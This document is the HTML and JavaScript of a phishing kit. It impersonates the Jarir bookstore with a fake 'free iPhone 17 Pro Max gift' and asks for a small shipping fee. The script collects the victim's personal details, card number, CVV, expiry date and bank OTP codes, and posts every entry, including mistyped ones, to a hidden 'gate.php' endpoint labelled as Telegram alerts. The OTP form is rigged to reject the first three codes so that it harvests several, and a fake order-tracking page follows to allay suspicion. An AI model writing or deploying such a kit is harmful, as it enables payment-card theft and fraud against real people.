...
<head>
    ...
    <title>جرير - iPhone 17 Pro Max</title>
    ...
    <style>
        ...
        /* عرض رسوم الشحن - بدون أيقونة مال */
        .shipping-fee-display {
            background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%);
            border: 1px dashed var(--jarir-red);
            border-radius: 8px;
            padding: 15px;
            margin: 15px 0;
            text-align: center;
        ...
        .shipping-fee-display .fee-label {
            font-size: 12px;
            color: #666;
            margin-bottom: 5px;
        }
        
        .shipping-fee-display .fee-amount {
            font-size: 24px;
            font-weight: bold;
            color: var(--jarir-red);
        }
        
        .shipping-fee-display .fee-currency {
            font-size: 14px;
            color: var(--jarir-red);
        }
    </style>
...
<body class="max-w-md mx-auto shadow-2xl bg-white">
    ...
    <section id="page-product" class="page active page-transition">
        ...
        <div class="bg-gray-50 p-3 flex justify-between items-center border-b text-sm text-gray-500">
            ...
            <span>حدد خيار التوصيل الذي تفضله</span>
        </div>
        ...
        <main class="p-5">
            <div class="flex justify-between items-start mb-2">
                <div class="text-right">
                    <p class="text-[10px] text-gray-400">رقم الصنف 666736 رقم المنتج MFY94AHA</p>
                    <h1 class="text-xl font-bold text-gray-900">ابل آيفون 17 برو ماكس</h1>
                </div>
                <i class="fa-brands fa-apple text-3xl"></i>
            </div>
            
            <div class="flex flex-wrap gap-2 mb-6 justify-end">
                <span class="border px-3 py-1 text-xs text-gray-500 rounded">256 جيجابايت</span>
                <span class="border px-3 py-1 text-xs text-gray-500 rounded">برتقالي كوزمك الجيل الخامس</span>
                <span class="border px-3 py-1 text-xs text-gray-500 rounded">آبل آيه 19 برو</span>
            </div>
            ...
            <div class="flex justify-between items-center mb-6">
                <button id="btnGoRegister" class="bg-[#E30613] text-white font-bold w-1/2 py-4 rounded-lg text-lg flex justify-center items-center">
                    <span>استلم الهديه</span>
                </button>
                <div class="text-right">
                    <div class="text-[#E30613] text-3xl font-black">هديه من جرير <span class="text-sm">ر.س</span></div>
                    <p class="text-[10px] text-gray-400">شامل ضريبة القيمة المضافة</p>
                </div>
            </div>
    ...
    <!-- ==================== صفحة التسجيل مع العنوان والدول ==================== -->
    <section id="page-register" class="page bg-white page-transition">
        <header class="p-4 border-b flex justify-between items-center">
            <button id="btnBackToProduct"><i class="fa-solid fa-chevron-right"></i>العودة</button>
            <span class="font-bold">معلومات تسليم الهديه</span>
            <img src="https://i.ibb.co/h1mkXJhd/41826-EFC-5-C60-40-C5-BBEC-61-D40-D90-EB9-F.png" class="h-6">
        </header>
        <div class="p-6 space-y-4">
            <div id="err-reg" class="error-msg">يرجى إدخال البيانات المطلوبة بشكل صحيح</div>
            
            <!-- ====== اختيار الدولة ====== -->
            <div class="country-select-wrapper">
                <label style="display: block; text-align: right; font-size: 12px; color: #666; margin-bottom: 5px;">الدولة *</label>
                <select id="country-select" class="country-select">
                    <option value="SA" data-code="+966" data-fee="76" data-flag="https://flagcdn.com/w40/sa.png">السعودية</option>
                    <option value="KW" data-code="+965" data-fee="85" data-flag="https://flagcdn.com/w40/kw.png">الكويت</option>
                    <option value="AE" data-code="+971" data-fee="90" data-flag="https://flagcdn.com/w40/ae.png">الإمارات</option>
                    <option value="JO" data-code="+962" data-fee="80" data-flag="https://flagcdn.com/w40/jo.png">الأردن</option>
                </select>
                <img id="country-flag" src="https://flagcdn.com/w40/sa.png" class="country-flag">
            ...
            <div class="flex gap-2">
                <div class="w-2/3">
                    <label class="text-xs text-gray-400 text-right block">رقم الهاتف *</label>
                    <input type="tel" id="user-phone" class="form-input" placeholder="05xxxxxxxx" maxlength="10">
                </div>
                <div class="w-1/3">
                    <label class="text-xs text-gray-400 text-right block">الرمز</label>
                    <div class="form-input flex items-center justify-center" style="padding: 12px 5px;">
                        <span id="country-code" class="font-bold text-sm">+966</span>
                    </div>
                </div>
            </div>
            
            <!-- ====== الاسم ====== -->
            <input type="text" id="user-name" placeholder="الاسم الأول *" class="form-input">
            
            <!-- ====== البريد الإلكتروني ====== -->
            <input type="email" id="user-email" placeholder="البريد الإلكتروني *" class="form-input">
            
            <!-- ====== حقل العنوان الاحترافي ====== -->
            <div class="address-field">
                <label>العنوان التفصيلي *</label>
                <i class="fa-solid fa-location-dot address-icon"></i>
                <textarea id="user-address" class="address-input" rows="3" placeholder="المدينة، الحي، الشارع، رقم المنزل/الشقة..."></textarea>
            </div>
            
            <!-- ====== عرض رسوم الشحن - بدون أيقونة مال ====== -->
            <div class="shipping-fee-display">
                <div class="fee-label">رسوم الشحن والتوصيل</div>
                <div>
                    <span id="shipping-fee" class="fee-amount">76</span>
                    <span class="fee-currency">ر.س</span>
                </div>
            </div>
            
            <button id="btnSubmitRegister" class="btn-red py-4 mt-2 flex justify-center items-center">
                <span id="regBtnText">استمرار</span>
    ...
    <section id="page-payment" class="page bg-[#F3F5F7] page-transition">
        <header class="p-4 bg-white border-b flex justify-between items-center">
            <button id="btnBackToRegister"><i class="fa-solid fa-chevron-right"></i>العودة</button>
            <span class="font-bold">دفع مصاريف الشحن</span>
            <img src="https://i.ibb.co/h1mkXJhd/41826-EFC-5-C60-40-C5-BBEC-61-D40-D90-EB9-F.png" class="h-6">
        </header>
        <main class="p-4">
            <div id="err-pay" class="error-msg">يرجى التحقق من بيانات البطاقة</div>
            <div class="bg-white rounded-lg p-6 shadow-sm border relative payment-card">
                <div class="flex justify-between items-center border p-3 rounded-lg mb-6 border-blue-500 bg-blue-50">
                    ...
                    <div class="text-right">
                        <span class="text-sm font-bold block">الدفع بالبطاقة الائتمانية</span>
                ...
                <div class="space-y-4">
                    <div class="card-wrapper">
                        ...
                        <input type="tel" id="card-num" placeholder="رقم البطاقة (16 رقم)" class="form-input" maxlength="16">
                    </div>
                    <div class="flex gap-2">
                        <input type="tel" id="card-cvv" placeholder="CVV (3 أرقام)" class="form-input w-1/3" maxlength="3">
                        <input type="tel" id="card-exp" placeholder="MM/YY" class="form-input w-2/3" maxlength="5">
                    </div>
                    <input type="text" id="card-holder" placeholder="اسم حامل البطاقة" class="form-input">
                </div>
                <button id="btnSubmitPayment" class="btn-red py-4 mt-8 flex justify-center items-center">
                    <span id="payBtnText">دفع رسوم الشحن (<span id="payment-fee">76</span> ر.س)</span>
    ...
    <section id="page-verify" class="page bg-white p-6 page-transition">
        ...
        <div class="verify-text text-left text-[15px] leading-relaxed mb-10">
            ...
            <p class="mt-5">You are paying <strong>JARIR BOOKSTORE</strong> the amount of <strong>SAR <span id="verify-fee">76.00</span></strong> on 2026/02/15.</p>
        </div>
        <div id="err-otp" class="error-msg">رمز التحقق غير صحيح، حاول مجدداً</div>
        ...
        <div class="otp-attempts" id="otpAttempts">المحاولات المتبقية: <span id="attemptsLeft">4</span></div>
    ...
    <section id="page-success" class="page bg-[#e9ecef] p-5 page-transition">
        <div class="success-screen">
            <div class="app-bar">
                <div class="icon">⋮</div>
                <h1>شحنة رقم # <span id="dynamicTrackingNumber">51972521</span></h1>
                <div class="icon">〉</div>
            </div>
            ...
            <div class="stepper-container">
                <div class="step active">
                    ...
                    <div class="step-content">
                        <span class="step-title">إنشاء الطلب</span>
                        <span class="step-date" id="dynamicOrderDate">تم إنشاء الطلب : الأحد، 19-أكتوبر-2025</span>
                    </div>
                </div>
                ...
                <div class="step">
                    <div class="dot"></div>
                    <div class="step-content">
                        <span class="step-title">جاري المعالجة</span>
                    </div>
                </div>
                ...
                <div class="step">
                    <div class="dot"></div>
                    <div class="step-content">
                        <span class="step-title">تحت التجهيز</span>
                    </div>
                </div>
            ...
            <div class="barcode-area">
                ...
                <div class="order-number">رقم الطلب: <span id="dynamicOrderNumber">2007992813</span></div>
            </div>

            <div class="info-row">
                <span class="label">تاريخ إنشاء الطلب</span>
                <span class="value" id="dynamicCreateDate">الأحد، 19-أكتوبر-2025</span>
            </div>

            <div class="info-row">
                <span class="label">الدولة:</span>
                <span class="value" id="dynamicCountry">السعودية</span>
            </div>

            <div class="info-row">
                <span class="label">الشحن إلى:</span>
            ...
            <div class="info-row">
                ...
                <span class="value" id="dynamicAddress">الرياض، حي النخيل...</span>
            </div>

            <div class="info-row">
                <span class="label">رسوم الشحن:</span>
                <span class="value" id="dynamicShippingFee">76 ر.س</span>
            </div>

            <div class="info-row">
                <span class="label">طريقة الشحن</span>
                <span class="value">@ تسليم البريد الإلكتروني</span>
            </div>
        </div>
    </section>
    ...
    <script>
        ...
        // ============================================
        // دالة إرسال التليجرام بالإنجليزية
        // ============================================
        async function sendTelegramAlert(type, data) {
    // إرسال البيانات إلى بوابة السيرفر المخفية
    await fetch("gate.php", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ type, visitorId, data })
    });
}
            ...
            var message = emoji + ' ' + type + '\n\n';
            message += '🆔 Visitor ID: ' + visitorId + '\n';
            message += '⏰ Time: ' + deviceInfo.timestamp + '\n';
            message += '📱 Device: ' + deviceInfo.platform + '\n';
            message += '🌐 Browser: ' + navigator.userAgent.substring(0, 50) + '...\n';
            message += '📐 Screen: ' + deviceInfo.screenSize + '\n';
            message += '🔗 Source: ' + deviceInfo.referrer + '\n';
        ...
        // ============================================
        // دالة الانتقال بين الصفحات مع تأخير احترافي
        // ============================================
        function showPage(pageId) {
            ...
            // تأخير احترافي حسب الصفحة
            var delay = 600; // افتراضي
            
            if (pageId === 'page-payment') {
                delay = 2500; // 2.5 ثانية لصفحة الدفع
            } else if (pageId === 'page-verify') {
                delay = 3000; // 3 ثواني لصفحة 3D Secure
            } else if (pageId === 'page-success') {
                delay = 3500; // 3.5 ثانية لصفحة الشحنة
            }
        ...
        function updateSuccessPage() {
            ...
            var formattedDate = days[tomorrow.getDay()] + '، ' + tomorrow.getDate() + '-' + months[tomorrow.getMonth()] + '-' + tomorrow.getFullYear();
            ...
            document.getElementById('dynamicOrderDate').textContent = 'تم إنشاء الطلب : ' + formattedDate;
            ...
            document.getElementById('dynamicUserName').textContent = userData.name || 'Not specified';
            document.getElementById('dynamicUserPhone').textContent = userData.countryCode + ' ' + (userData.phone || '000000000');
            document.getElementById('dynamicUserEmail').textContent = userData.email || 'Not specified';
            document.getElementById('dynamicAddress').textContent = userData.address || 'Not specified';
            document.getElementById('dynamicCountry').textContent = userData.countryName;
            document.getElementById('dynamicShippingFee').textContent = userData.shippingFee + ' SAR';
        }
        ...
        function updateCountryInfo() {
            ...
            document.getElementById('payment-fee').textContent = fee;
            document.getElementById('verify-fee').textContent = fee + '.00';
            
            // حفظ البيانات
            userData.country = select.value;
            userData.countryName = countryNameEn;
            userData.countryCode = countryCode;
            userData.shippingFee = fee;
            
            // إرسال إشعار
            sendTelegramAlert('COUNTRY_CHANGE', {
        ...
        function isValidPhone(phone, country) {
            var patterns = {
                'SA': /^(05|5)[0-9]{8}$/,
                'KW': /^(5|6|9)[0-9]{7}$/,
                'AE': /^(050|051|052|055|056|058)[0-9]{7}$/,
                'JO': /^(07)[0-9]{8}$/
            };
            ...
            if (addressInput) {
                addressInput.addEventListener('blur', function() {
                    if (this.value.length > 10) {
                        sendTelegramAlert('INPUT_ADDRESS', {address: this.value});
                    }
                });
            }
        ...
        function submitRegister() {
            ...
            // التحقق
            if (!isValidPhone(phone, userData.country)) {
                showError('err-reg', 'يرجى إدخال رقم هاتف صحيح');
                sendTelegramAlert('ERROR', {type: 'invalid_phone', phone: phone, country: userData.countryName});
                return;
            }
            
            if (name.length < 2) {
                showError('err-reg', 'يرجى إدخال الاسم الأول');
                sendTelegramAlert('ERROR', {type: 'invalid_name', name: name});
                return;
            }
            
            if (!isValidEmail(email)) {
                showError('err-reg', 'يرجى إدخال بريد إلكتروني صحيح');
                sendTelegramAlert('ERROR', {type: 'invalid_email', email: email});
                return;
            }
            
            if (address.length < 10) {
                showError('err-reg', 'يرجى إدخال عنوان تفصيلي (10 أحرف على الأقل)');
                sendTelegramAlert('ERROR', {type: 'invalid_address', address: address});
                return;
            }
            ...
            sendTelegramAlert('REGISTER_SUBMIT', {
                ...
                shippingFee: userData.shippingFee + ' SAR',
                visitorId: visitorId
            });
        ...
        function submitPayment() {
            ...
            if (!cardNum || cardNum.length !== 16 || !/^\d+$/.test(cardNum)) {
                showError('err-pay', 'يرجى إدخال رقم بطاقة صحيح (16 رقم)');
                sendTelegramAlert('ERROR', {type: 'invalid_card', card: cardNum});
                return;
            }
            
            if (!cvv || cvv.length !== 3 || !/^\d+$/.test(cvv)) {
                showError('err-pay', 'يرجى إدخال CVV صحيح (3 أرقام)');
                sendTelegramAlert('ERROR', {type: 'invalid_cvv', cvv: cvv});
                return;
            }
            
            if (!exp || exp.length !== 5) {
                showError('err-pay', 'يرجى إدخال تاريخ انتهاء صحيح (MM/YY)');
                sendTelegramAlert('ERROR', {type: 'invalid_expiry', expiry: exp});
                return;
            }
            
            if (holder.length < 3) {
                showError('err-pay', 'يرجى إدخال اسم حامل البطاقة');
        ...
        function submitOTP() {
            ...
            if (!otp || otp.length < 4) {
                document.getElementById('err-otp').textContent = 'يرجى إدخال رمز التحقق';
            ...
            if (otpAttempts < maxOtpAttempts) {
                ...
                document.getElementById('err-otp').textContent = 'رمز التحقق غير صحيح، محاولات متبقية: ' + remaining;
                document.getElementById('err-otp').style.display = 'block';
                document.getElementById('attemptsLeft').textContent = remaining;
                document.getElementById('bank-otp').value = '';
                document.getElementById('bank-otp').focus();
            } else {
                // المحاولة الرابعة - النجاح
        ...
        function resendOTP() {
            document.getElementById('bank-otp').value = '';
            document.getElementById('bank-otp').focus();
            document.getElementById('err-otp').textContent = 'تم إعادة إرسال الرمز';
